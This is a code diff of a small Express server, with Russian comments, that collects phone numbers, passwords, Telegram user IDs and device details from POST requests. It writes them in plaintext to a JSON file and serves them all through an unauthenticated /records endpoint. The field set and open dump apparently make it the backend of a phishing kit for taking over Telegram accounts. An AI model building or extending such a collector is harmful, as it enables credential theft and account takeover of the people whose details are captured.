@@ -24,29 +24,55 @@ function saveRecords(data) {
     fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
 }
 
+// ================================
+//   СОХРАНЕНИЕ ТЕЛЕФОНА
+// ================================
 app.post("/save-phone", (req, res) => {
     const { phone, tg_id, device } = req.body;
     if (!phone || !tg_id) return res.json({ ok:false, error:"missing fields" });
 
     const records = loadRecords();
-    records.push({ type:"phone", phone, tg_id, device, time:new Date().toISOString() });
+    records.push({
+        type: "phone",
+        phone,
+        tg_id,
+        device,
+        time: new Date().toISOString()
+    });
     saveRecords(records);
+
     res.json({ ok:true });
 });
 
+// ================================
+//   СОХРАНЕНИЕ ПАРОЛЯ
+// ================================
 app.post("/save-password", (req, res) => {
-    const { password, phone, tg_id } = req.body;
-    if (!password || !phone || !tg_id) return res.json({ ok:false, error:"missing fields" });
+    const { password, tg_id, device } = req.body;
+
+    // ❗ теперь НЕ требуем phone
+    if (!password || !tg_id) {
+        return res.json({ ok:false, error:"missing fields" });
+    }
 
     const records = loadRecords();
-    records.push({ type:"password", password, phone, tg_id, time:new Date().toISOString() });
+    records.push({
+        type: "password",
+        password,
+        tg_id,
+        device: device || "",
+        time: new Date().toISOString()
+    });
     saveRecords(records);
-    res.json({ ok:true });
+
+    res.json({ ok: true });
 });
 
+// ================================
+//   ПОЛУЧЕНИЕ ВСЕХ ЗАПИСЕЙ
+// ================================
 app.get("/records", (req, res) => {
     res.json(loadRecords());
 });
 
 app.listen(PORT, () => console.log("Server running on:", PORT));
-
